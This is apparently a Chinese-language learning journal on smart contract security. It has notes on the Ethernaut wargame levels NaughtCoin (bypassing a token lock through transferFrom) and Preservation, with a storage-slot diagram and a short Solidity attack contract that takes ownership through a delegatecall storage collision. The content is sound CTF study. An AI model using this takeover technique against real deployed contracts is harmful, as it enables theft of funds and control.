---
timezone: Asia/Shanghai
---


# Ha2ryzhang

1. 自我介绍

    Hi,I'm ha2ryzhang.
    正在学习合约安全相关的内容.

2. 你认为你会完成本次残酷学习吗？

    尽力而为之.

## Notes

<!-- Content_START -->

### 2024.08.29

接着之前一直做了一半的 `Ethernaut` 继续学习
#### A-Ethernaut-NaughtCoin
[link](https://ethernaut.openzeppelin.com/level/0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F)

##### 这题问题主要是 ERC20转账方式
[WTF Academy](https://www.wtf.academy/docs/solidity-103/ERC20/)
1. `transfer`
2. `transferFrom`
他这里只对 `transfer`进行了重写 所以 `transferFrom` 是可以绕过`lockTokens`的检查的.
按顺序做的,这题还是相对简单点.

### 2024.08.30

#### A-Ethernaut-Preservation
看到题目是需要获取合约的owner权限,但是又没看到set owner的方法.
看到了`delegatecall`,想到了`slot`相关的,很久之前看过了,有点忘记了,先查一下.

[delegatecall](https://www.wtf.academy/docs/solidity-102/Delegatecall/) 是需要顺序和数据类型保持一致的.
##### 分析

[资料](https://ctf-wiki.org/blockchain/ethereum/storage/)

`address`：地址类型存储一个 20 字节的值（以太坊地址的大小）。 地址类型也有成员变量，并作为所有合约的基础。
```
-----------------------------------------------------
| unused (12)   |   timeZone1Library (20)           | <- slot 0
-----------------------------------------------------
| unused (12)   |   timeZone2Library (20)           | <- slot 1
-----------------------------------------------------
| unused (12)   |             owner (20)            | <- slot 2
-----------------------------------------------------
|                storedTime (32)                    | <- slot 3
-----------------------------------------------------
| unused (28)   |        setTimeSignature (4)       | <- slot 4
-----------------------------------------------------

```
上面是`Preservation.sol`合约中变量的`Storage Slot`


问题就在于`LibraryContract`合约中slot位置对不上

```
-----------------------------------------------------
|                storedTime (32)                    | <- slot 0
-----------------------------------------------------

```
这么一对比可以很直观看到.理论上无论调用`setFirstTime`或者`setSecondTime`都会是修改
变量`timeZone1Library`的值.那么只需要一个攻击合约对应上`owner`所在的slot就能修改owner了

##### 攻击

```solidity
contract Attack{
    address public tmp1;
    address public tmp2;
    address public owner;
    function setTime(uint256 _time) public {
        //类型转换 time 为 address
        owner = address(uint160(_time));
    }
}
```
合约中owner对上即可,测试通过!
还有一个类型转换的点:
1. uint256 到 uint160:
address 类型在 Solidity 中是一个 20 字节（160 位）的值，而 uint256 是一个 32 字节（256 位）的值。
因此，需要先将 uint256 转换为 uint160，因为 uint160 也正好是 20 字节，可以容纳 address 类型的数据。
2. uint160 到 address:
将 uint160 转换为 address 类型非常简单，只需要将其强制转换即可。


<!-- Content_END -->
